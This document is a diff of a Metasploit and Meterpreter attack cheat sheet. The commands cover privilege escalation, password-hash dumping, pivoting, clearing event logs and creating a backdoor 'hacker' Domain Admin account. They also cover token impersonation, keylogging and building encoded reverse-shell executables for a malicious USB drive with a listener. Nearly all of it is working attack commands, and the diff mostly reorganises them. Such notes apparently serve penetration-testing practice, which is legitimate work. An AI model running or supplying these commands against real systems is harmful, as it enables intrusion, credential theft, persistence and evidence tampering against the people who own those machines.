@@ -164,10 +164,10 @@ set ExitOnSession false
 set LPORT 22
 exploit -j
  
-sendEmail -t ceo@target.com -f hacker@gmail.com -s <targetIP> -u Salaries -a /root/Desktop/salaries.pdf
+sendEmail -t ceo@target.com -f hacker@gmail.com -s <target IP> -u Salaries -a /root/Desktop/salaries.pdf
 ------------------------------------------------------------------------------------------------------
 
-# Pivoting
+# Meterpreter - Pivoting
  
 meterpreter > ipconfig
 192.168.0.10
@@ -183,7 +183,7 @@ meterpreter > run arp_scanner -r 10.10.10.1/24
 10.0.0.20
 
 meterpreter > background
-route add 10.0.0.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
+route add 10.0.0.1 255.255.255.0 x            Where x is the meterpreter session number.
 route print
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 10.0.0.20
@@ -196,31 +196,48 @@ set PAYLOAD windows/meterpreter/bind_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
 
-# Post Exploitation using meterpreter
+# Meterpreter - Post Exploitation
 
-run migrate                                   Create a new process and migrate to it.
+getpid                                        Show the current process ID.
 ps                                            Show running processes.
-sysinfo                                       Show host name and OS.
+migrate                                       Create a new process and migrate to it.
+migrate <pid>                                 Migrate to a specific process.
+
+sysinfo                                       Show system info.
 getuid                                        Show current privileges.
-     if not NT AUTHORITY\SYSTEM
-     use priv                                 Escalate privileges.
-     getsystem                                If this fails: run post/windows/escalate/bypassuac
-     getuid                                   Privileges should now be NT AUTHORITY\SYSTEM
-screenshot                                    Take a photo of the desktop. 
-hashdump                                      Dump the password hashed.
-ipconfig                                      Look for dual-homed connections
-     if dual-homed
-     run autoroute -s <new CIDR range>
-     run autoroute -p                         Print routing table.
+getprivs                                      Escalate privileges if not NT AUTHORITY\SYSTEM.
+getsystem                                     If this fails: run post/windows/escalate/bypassuac.
+getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
+
+screenshot                                    Take a photo of the desktop.
+
+hashdump                                      Dump password hashes.
+
+ipconfig                                      Look for dual-homed connections.
+autoroute -s <new CIDR range>                 If dual-homed.
+autoroute -p                                  Print routing table.
 route
 
-use incognito
-list_tokens -g
-list_tokens -u
+clearev                                       Clear event logs.
+------------------------------------------------------------------------------------------------------
+
+# Meterpreter - Add User Account
 
 add_user hacker password -h <target IP>
-add_group_user "Enterprise Admins" hacker -h <target IP>
 add_group_user "Domain Admins" hacker -h <target IP>
+------------------------------------------------------------------------------------------------------
+
+# Meterpreter - Impersonate User Account
+
+use incognito
+list_tokens -u
+impersonate_token <token>
+getuid
+shell
+
+C:\ whoami
+C:\ net user hacker password /add /domain
+C:\ net group "Domain Admins" hacker /add /domain
 ------------------------------------------------------------------------------------------------------
 
 # psexec
@@ -248,26 +265,6 @@ Execute evil.php on web server.
 ------------------------------------------------------------------------------------------------------
 
 ===  Below here are OLD notes that have NOT been organized.  ===
-
-meterpreter > impersonate_token DOMAIN\Administrator
-[+] Delegation token available
-[+] Successfully impersonated user DOMAIN\Administrator 
-
-meterpreter > getuid
-Server username: DOMAIN\Administrator 
-
-meterpreter > shell
-
-C:\WINDOWS\system32> whoami
-whoami
-DOMAIN\administrator
-
-C:\WINDOWS\system32> net user hacker password /add /domain
-The command completed successfully.
-
-C:\WINDOWS\system32> net group "Domain Admins" hacker /add /domain
-The command completed successfully.
-==========
 
 (Open a new tab in Konsole)
      cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
@@ -310,13 +307,13 @@ meterpreter > exit
 
 # Malicious USB Drive
 
-msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
-msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=attackerIP LPORT=443 > evil.exe
-msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -b "/x00" -t exe -e x86/shikata_ga_nai -c 6 -o /root/evil.exe 
+msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
+msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=10.0.0.5 LPORT=443 > evil.exe
+msfpayload windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 R | msfencode -b "/x00" -t exe -e x86/shikata_ga_nai -c 6 -o evil.exe 
 
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_https
-set LHOST <attacker IP>
+set LHOST 10.0.0.5
 set LPORT 443
 set ExitOnSession false
 exploit -j
@@ -384,12 +381,6 @@ exploit -j -z
 run <tab>
 ==========
 
-# Session hijack tokens
-
-use incognito
-impersonate_token "NT AUTHORITY\\SYSTEM"
-==========
-
 # Find and download files
 
 run search_dwld "%USERPROFILE%\\my documents" passwd
@@ -450,23 +441,6 @@ keyscan_stop
 
 set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
 ==========
- 
-run post/windows/gather/credentials/vnc
-run post/windows/gather/cachedump
-use incognito
-list_tokens -u
-==========
-
-hashdump
-run post/windows/gather/cachedump
-use incognito
-list_tokens -u
-
-<add user>
-sysinfo
-
-run post/windows/gather/credentials/vnc
-——————————————————————————————
 
 auxiliary(mssql_sql) > set sql EXEC sp_addlogin hacker, password;EXEC master.dbo.sp_addsrvrolemember hacker, sysadmin;  —priv
 run
